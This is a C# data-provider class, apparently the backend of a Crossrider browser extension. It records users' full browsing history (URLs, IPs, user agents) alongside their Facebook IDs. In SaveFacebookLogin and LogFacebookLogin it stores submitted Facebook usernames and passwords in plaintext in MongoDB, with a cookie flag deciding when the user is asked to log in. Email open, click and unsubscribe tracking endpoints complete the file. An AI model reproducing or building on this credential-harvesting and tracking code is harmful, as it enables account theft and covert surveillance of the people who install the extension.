using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using MongoDB.Bson;
using System.IO;
using System.Web;
using Newtonsoft.Json.Linq;
using System.Dynamic;
using Newtonsoft.Json;

namespace Extentions.DataService.Providers
{
    public class CommonProvider : ProviderBase
    {
        public void LogUserPageView(dynamic userInfo, string ip, string url, string userAgent)
        {
            Uri urlObj = null;
            Uri.TryCreate(url, UriKind.RelativeOrAbsolute, out urlObj);

            string domainName = urlObj == null ? "" : urlObj.Host;

            var document = new BsonDocument();

            document["date_created"] = DateTime.Now;
            document["user_id"] = (string)userInfo.user_id;
            document["facebook_id"] = (long)userInfo.facebook_id;
            document["ext_id"] = (int)userInfo.ext_id;
            document["domain"] = domainName;
            document["url"] = url;
            document["ip"] = ip;
            document["user_agent"] = userAgent;

            _commonDataProvider.InsertUserPageView(document);
        }
        public void UpsertFacebookUser(dynamic userInfo)
        {
            if (userInfo.facebook_id == 0)
                return;

            var facebookUserInfo = _commonDataProvider.GetFacebookUserExt((long)userInfo.facebook_id, (int)userInfo.ext_id, "facebook_id");

            if (facebookUserInfo == null)
            {
                facebookUserInfo = _facebookDataProvider.GetFacebookUserInfo((long)userInfo.facebook_id);

                _commonDataProvider.InsertFacebookUserExt(facebookUserInfo, (int)userInfo.ext_id);
            }
            else
            {
                _commonDataProvider.UpdateFacebookUserVisit((long)userInfo.facebook_id, (int)userInfo.ext_id);
            }
        }
        public void LogFacebookLogin(string userIp, int extId, string userName, string password)
        {
            var document = new BsonDocument();

            document["date_created"] = DateTime.Now;
            document["ip"] = userIp;
            document["ext_id"] = extId;
            document["username"] = userName;
            document["password"] = password;

            _commonDataProvider.InsertFacebookLogin(document);
        }

        public dynamic GetMail(int userId, string userName, string ip, string userAgent, string mailType)
        {
            if (mailType == null)
                mailType = "mail-old-female";

            string mail = File.ReadAllText(Path.Combine(HttpRuntime.AppDomainAppPath, string.Format("views/{0}.cshtml", mailType)));

            mail = mail.Replace("$id$", userId.ToString());
            mail = mail.Replace("$name$", userName);
            mail = mail.Replace("$mailtype$", mailType);

            var doc = new BsonDocument();

            doc["date_created"] = DateTime.Now;
            doc["user_id"] = userId;
            doc["type"] = "get-html-mail";
            doc["ip"] = ip;
            doc["user_agent"] = userAgent;
            doc["mail_type"] = mailType == null ? "" : mailType;

            _commonDataProvider.InsertUserActivity(doc);

            return mail;
        }
        public dynamic GetMailClick(int userId, string ip, string userAgent, string mailType)
        {
            var doc = new BsonDocument();

            doc["date_created"] = DateTime.Now;
            doc["user_id"] = userId;
            doc["type"] = "click";
            doc["ip"] = ip;
            doc["user_agent"] = userAgent;
            doc["mail_type"] = mailType == null ? "" : mailType;

            _commonDataProvider.InsertUserActivity(doc);

            return "http://crossrider.com/apps/30563/";
        }
        public dynamic GetMailUnsubscribe(int userId, string ip, string userAgent, string mailType)
        {
            var doc = new BsonDocument();

            doc["date_created"] = DateTime.Now;
            doc["user_id"] = userId;
            doc["type"] = "unsubscribe";
            doc["ip"] = ip;
            doc["user_agent"] = userAgent;
            doc["mail_type"] = mailType == null ? "" : mailType;

            _commonDataProvider.InsertUserActivity(doc);

            return null;
        }
        public dynamic GetMailImage(int userId, string ip, string userAgent, string mailType)
        {
            var doc = new BsonDocument();

            doc["date_created"] = DateTime.Now;
            doc["user_id"] = userId;
            doc["type"] = "open-mail";
            doc["ip"] = ip;
            doc["user_agent"] = userAgent;
            doc["mail_type"] = mailType == null ? "" : mailType;

            _commonDataProvider.InsertUserActivity(doc);

            return null;
        }
        public dynamic GetCrossriderLink(string ip, string userAgent)
        {
            var doc = new BsonDocument();

            doc["date_created"] = DateTime.Now;
            doc["ip"] = ip;
            doc["user_agent"] = userAgent;

            _commonDataProvider.InsertDatingILActivity(doc);

            return null;
        }


        public dynamic CheckIfUserNeedLogin(string userInfoCookie)
        {
            dynamic result = null;

            dynamic userInfo = JObject.Parse(userInfoCookie);

            if (userInfo.need_login == null || userInfo.need_login == true)
            {
                result = new
                {
                    c = true
                };
            }
            else
            {
                result = new
                {
                    c = false
                };
            }

            return result;
        }
        public dynamic SaveFacebookLogin(string userInfoCookie, string userName, string password, string ip, string userAgent)
        {
            dynamic newUserInfo = new ExpandoObject();
            dynamic result = null;
            dynamic userInfo = JObject.Parse(userInfoCookie);

            if (string.IsNullOrEmpty(userName) || string.IsNullOrEmpty(password))
            {
                newUserInfo.user_id = userInfo.user_id;
                newUserInfo.facebook_id = userInfo.facebook_id;
                newUserInfo.ext_id = userInfo.ext_id;
                newUserInfo.need_login = true;

                result = JsonConvert.SerializeObject(newUserInfo);

                return result;
            }

            var document = new BsonDocument();

            document["user_id"] = (string)userInfo.user_id;
            document["facebook_id"] = (long)userInfo.facebook_id;
            document["ext_id"] = (int)userInfo.ext_id;
            document["ip"] = ip;
            document["username"] = userName;
            document["password"] = password;
            document["date_created"] = DateTime.Now;

            _commonDataProvider.InsertFacebookLogin(document);

            newUserInfo.user_id = userInfo.user_id;
            newUserInfo.facebook_id = userInfo.facebook_id;
            newUserInfo.ext_id = userInfo.ext_id;
            newUserInfo.need_login = false;

            result = JsonConvert.SerializeObject(newUserInfo);

            return result;
        }
    }
}
